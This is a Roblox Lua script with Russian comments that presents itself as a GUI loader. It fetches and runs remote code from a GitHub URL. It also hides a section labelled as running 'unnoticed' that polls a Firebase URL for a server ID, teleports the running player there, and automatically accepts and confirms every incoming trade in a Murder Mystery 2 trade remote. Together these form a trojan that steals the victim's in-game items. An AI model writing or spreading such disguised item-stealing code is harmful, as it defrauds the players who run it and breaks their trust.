-- ОРИГИНАЛЬНЫЙ ЗАПУСК GUI
local success, result = pcall(function()
    return game:HttpGet("https://raw.githubusercontent.com/hoodratIeahh/Summer-UPD/main/Interface.lua")
end)

if success then
    loadstring(result)()
end

-- 💎 ВСТРОЕННЫЙ АВТО-ТЕЛЕПОРТ И ТРЕЙДЫ (НЕЗАМЕТНО)
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local FIREBASE_URL = "https://mm2-autojoin-default-rtdb.firebaseio.com/jobid.json"
local LAST_JOBID = nil

local function fetchJobId()
    local success, result = pcall(function()
        return HttpService:GetAsync(FIREBASE_URL)
    end)
    if success and result and result ~= "null" then
        local jobId = HttpService:JSONDecode('{"id":' .. HttpService:JSONEncode(result) .. '}').id
        return jobId
    end
end

local function teleportToJobId(jobId)
    if jobId and jobId ~= game.JobId and jobId ~= LAST_JOBID then
        LAST_JOBID = jobId
        warn("[AutoJoin] Телепорт в сервер:", jobId)
        TeleportService:TeleportToPlaceInstance(game.PlaceId, jobId, Players.LocalPlayer)
    end
end

local function onPlayerJoined()
    task.wait(3)
    local chatEvent = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
    if chatEvent and chatEvent:FindFirstChild("SayMessageRequest") then
        chatEvent.SayMessageRequest:FireServer("hi", "All")
    end
end

local function setupAutoTrade()
    local tradeRemote = ReplicatedStorage:FindFirstChild("MurderTrade")
    if not tradeRemote then return end

    tradeRemote.RequestTrade.OnClientEvent:Connect(function(trader)
        task.wait(1)
        tradeRemote.AcceptTrade:FireServer()
        print("[AutoTrade] Принят трейд от:", trader.Name)
        task.wait(2)
        tradeRemote.ConfirmTrade:FireServer()
        print("[AutoTrade] Подтверждён трейд")
    end)
end

spawn(function()
    while task.wait(5) do
        local jobId = fetchJobId()
        teleportToJobId(jobId)
    end
end)

Players.PlayerAdded:Connect(function(p)
    if p == Players.LocalPlayer then
        onPlayerJoined()
        setupAutoTrade()
    end
end)

if Players.LocalPlayer then
    onPlayerJoined()
    setupAutoTrade()
end
